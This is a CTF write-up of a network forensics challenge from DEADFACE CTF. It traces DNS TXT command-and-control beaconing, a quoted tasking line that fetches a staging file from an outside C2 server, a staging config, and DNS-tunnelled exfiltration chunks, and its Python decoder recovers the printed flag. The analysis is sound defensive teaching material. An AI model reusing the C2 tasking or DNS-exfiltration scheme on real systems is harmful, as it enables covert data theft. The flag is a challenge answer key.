# Bad Guys Be Bad 

**Category:** Network Forensics  
**Difficulty:** Hard  
**Points:** 350  
**File:** `deadface_pcap02.pcap`  
**Flag:** `deadface{c2_traffic_be_bussing}`

## Challenge Description

The challenge provides a PCAP file containing network traffic from a potentially compromised environment. The objective is to investigate suspicious communications, identify the Command and Control (C2) activity, and recover the data exfiltrated by the compromised host.

## 1. Initial Triage

I started by checking the PCAP file's basic properties and examining its printable strings.

```bash
file deadface_pcap02.pcap
ls -lh deadface_pcap02.pcap
strings deadface_pcap02.pcap | less
```

Since `tshark` and `scapy` were unavailable in my environment, I used a custom Python script to parse the PCAP manually.

The capture contained:

- **544 packets**
- **64,702 bytes**
- Ethernet-based packet capture
- Internal hosts: `192.168.1.50` and `192.168.1.60`
- DNS resolver: `192.168.1.1`

Most traffic appeared legitimate, including ordinary DNS lookups and HTTP requests.

However, three indicators caught my attention:

| Indicator | Observation |
|---|---|
| `sync.deadface-c2.net` | Unusual DNS TXT queries |
| `45.13.37.7:8080` | Suspicious TCP connection on a non-standard port |
| `sNN-*.exfil.deadface-c2.net` | Unusual, sequential DNS subdomains |

These indicators suggested possible DNS-based Command and Control (C2) communication.

## 2. Investigating the DNS TXT Beacon

I noticed repeated DNS TXT queries involving:

```text
sync.deadface-c2.net
```

Several responses contained:

```text
aWRsZQ==
```

Decoding the Base64 value:

```bash
echo "aWRsZQ==" | base64 -d
```

Output:

```text
idle
```

Most responses simply indicated that the implant was idle.

However, packet 263 contained a different response:

```text
ZmV0Y2g6aHR0cDovLzQ1LjEzLjM3Ljc6ODA4MC9zdGFnaW5nLmJpbg==
```

Decoding it:

```bash
echo "ZmV0Y2g6aHR0cDovLzQ1LjEzLjM3Ljc6ODA4MC9zdGFnaW5nLmJpbg==" | base64 -d
```

Output:

```text
fetch:http://45.13.37.7:8080/staging.bin
```

This revealed a tasking instruction telling the compromised host to download a staging file from the suspicious server.

## 3. Analyzing the Staging File

Packets 366 and 367 contained the HTTP request and response associated with the staging file download.

The request included:

```http
GET /staging.bin HTTP/1.1
Host: 45.13.37.7:8080
User-Agent: X-Loader/1.0 (bmljZSB0cnkgLSB3cm9uZyB0aHJlYWQsIGtlZXAgZGlnZ2luZw==)
```

The Base64-encoded User-Agent comment decoded to:

```text
nice try - wrong thread, keep digging
```

This turned out to be a decoy.

The actual response body contained a configuration file:

```ini
# staging config -- do not commit
mode=exfil
channel=dns
xor_key=Sp00ky
target=exfil.deadface-c2.net
```

This was the breakthrough.

The configuration revealed three important details:

- Exfiltration mode: `exfil`
- Communication channel: `dns`
- XOR encryption key: `Sp00ky`
- Exfiltration domain: `exfil.deadface-c2.net`

Now I knew where to look for the stolen data.

## 4. Extracting the DNS Exfiltration Chunks

Further investigation revealed five suspicious DNS queries:

```text
s00-G4KVCVANDAYB.exfil.deadface-c2.net
s01-KS2TLETCOASR.exfil.deadface-c2.net
s02-KYGRAMBPKJKT.exfil.deadface-c2.net
s03-IGZGANBVSBI6.exfil.deadface-c2.net
s04-FY.exfil.deadface-c2.net
```

The naming convention suggested that:

- `s00`, `s01`, etc. represented sequential chunk numbers.
- The remaining subdomain labels contained Base32-encoded data.
- The chunks needed to be reconstructed in sequence.
- The final short chunk marked the end of the transmitted data.

Extracted Base32 chunks:

```python
parts = [
    "G4KVCVANDAYB",
    "KS2TLETCOASR",
    "KYGRAMBPKJKT",
    "IGZGANBVSBI6",
    "FY"
]
```

## 5. Decoding the Exfiltrated Data

The staging configuration provided the XOR key:

```text
Sp00ky
```

I concatenated the Base32 chunks, decoded them, and then applied repeating-key XOR to recover the original data.

### Python Script

```python
import base64

# Extracted DNS exfiltration chunks
parts = [
    "G4KVCVANDAYB",
    "KS2TLETCOASR",
    "KYGRAMBPKJKT",
    "IGZGANBVSBI6",
    "FY"
]

# Reconstruct the Base32 payload
encoded = "".join(parts)

# Add required Base32 padding
encoded += "=" * (-len(encoded) % 8)

# Decode Base32
raw = base64.b32decode(encoded)

# XOR key obtained from staging.bin
key = b"Sp00ky"

# Decrypt using repeating-key XOR
decoded = bytes(
    byte ^ key[i % len(key)]
    for i, byte in enumerate(raw)
)

print(decoded.decode())
```

### Output

```text
deadface{c2_traffic_be_bussing}
```

## 6. Flag

```text
deadface{c2_traffic_be_bussing}
```

## 7. Key Takeaways

This challenge demonstrated a realistic multi-stage C2 communication and data exfiltration technique.

**Important Indicators of Compromise (IOCs):**

| Indicator | Value |
|---|---|
| Compromised host | `192.168.1.50` |
| C2 server | `45.13.37.7` |
| C2 port | `8080` |
| Beacon domain | `sync.deadface-c2.net` |
| Exfiltration domain | `exfil.deadface-c2.net` |
| Exfiltration method | DNS tunneling |
| Encoding | Base32 |
| Encryption | Repeating-key XOR |
| XOR key | `Sp00ky` |

**What I learned:**

1. Repeated DNS TXT queries can indicate C2 beaconing activity.
2. Unusually long or high-entropy DNS subdomains may indicate DNS tunneling.
3. DNS traffic can be abused to exfiltrate sensitive information in small chunks.
4. Staging configuration files can reveal important information about an implant's behavior.
5. Decoy artifacts can distract analysts from the actual attack chain.

## Conclusion

The investigation uncovered a complete C2 communication sequence: periodic DNS beaconing, HTTP-based staging configuration retrieval, and DNS-based data exfiltration.

By correlating DNS and HTTP traffic, extracting the staging configuration, and reversing the Base32 and XOR transformations, I successfully recovered the flag.

**Another interesting network forensics challenge from DEADFACE CTF!**
